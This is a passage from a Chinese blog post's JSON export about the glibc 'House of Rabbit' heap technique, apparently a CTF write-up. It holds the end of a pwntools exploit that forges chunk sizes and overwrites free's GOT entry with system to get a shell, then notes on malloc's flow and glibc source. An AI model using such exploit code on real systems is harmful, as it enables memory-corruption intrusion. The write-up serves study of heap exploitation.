number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNi1ob3VzZS1vZi1yYWJiaXQ=\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#26-house-of-rabbit</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hMWV4Lm9ubGluZS8yMDIwLzEwLzE1L0hvdXNlLW9mLVJhYmJpdCVFNSVBRCVBNiVFNCVCOSVBMC8=\">https://a1ex.online/2020/10/15/House-of-Rabbit 学习 /</span></p>\n</blockquote>\n<blockquote>\n<p>增文</p>\n<p>malloc 全流程</p>\n<pre><code>首先是检查是否满足fastbin大小要求，满足且存在适合的chunk就从fastbin中分配\n\n然后检查是否满足smallbin，满足且存在适合的chunk就从smallbin中分配\n\n同时检查是否满足largebin，满足就计算一下所属的largebin的索引idx\n\n进行unsortedbin的处理过程，从后向前遍历unsortedbin链表，满足切割分配就切割分配，大小精确匹配就分配，大小不匹配的就根据大小装入largebin和smallbin\n\n注意：这里会检查申请大小是否超出系统内存！这是该版本malloc中唯一检查的地方，如果没有unsortedbin，就不进行检查\nunsortedbin处理完之后，从largebin中找满足大小要求的chunk分配，要么直接分配出去，要么切割分配出去，剩下的部分装入unsortedbin\n\nlargebin中最大的chunk范围是0x80000 - ∞\n从largebin中分配不检查申请大小是否超出系统内存\n最后在从top chunk分配，分配不了就用sysmalloc去映射内存或者扩大top chunk\n</code></pre>\n</blockquote>\n<blockquote>\n<p><code>malloc_consolidate</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* current fastbin being consolidated */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    maxfb<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* last fastbin (for loop control) */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> mchunkptr       p<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">/* current chunk being consolidated */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> mchunkptr       nextp<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* next chunk to consolidate */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> mchunkptr       unsorted_bin<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* bin header */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> mchunkptr       first_unsorted<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* chunk to link to */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token comment\">/* These have same use as in free() */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> mchunkptr       nextchunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> INTERNAL_SIZE_T nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> INTERNAL_SIZE_T prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token keyword\">int</span>             nextinuse<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> mchunkptr       bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> mchunkptr       fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token function\">atomic_store_relaxed</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>av<span class=\"token operator\">-></span>have_fastchunks<span class=\"token punctuation\">,</span> false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> unsorted_bin <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   Remove each chunk from fast bin and consolidate it, placing it</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   then in unsorted bin. Among other reasons for doing this,</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   placing in unsorted bin avoids needing to calculate actual bins</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   until malloc is sure that chunks aren't immediately going to be</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   reused anyway.</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> maxfb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> NFASTBINS <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   p <span class=\"token operator\">=</span> <span class=\"token function\">atomic_exchange_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>     <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> idx <span class=\"token operator\">=</span> <span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> fb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t    <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_consolidate(): invalid chunk size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">check_inuse_chunk</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tnextp <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token comment\">/* Slightly streamlined version of consolidation code in free() */</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tnextchunk <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tnextsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t  prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t  p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t  <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t  nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t    <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t  first_unsorted <span class=\"token operator\">=</span> unsorted_bin<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t  unsorted_bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t  first_unsorted<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t    p<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t    p<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t  p<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> unsorted_bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t  p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> first_unsorted<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t  <span class=\"token function\">set_foot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t  av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> nextp<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fb<span class=\"token operator\">++</span> <span class=\"token operator\">!=</span> maxfb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></blockquote>\n",
            "tags": [
                "house系列",
                "house-of-rabbit"
            ]
        }
    ]
}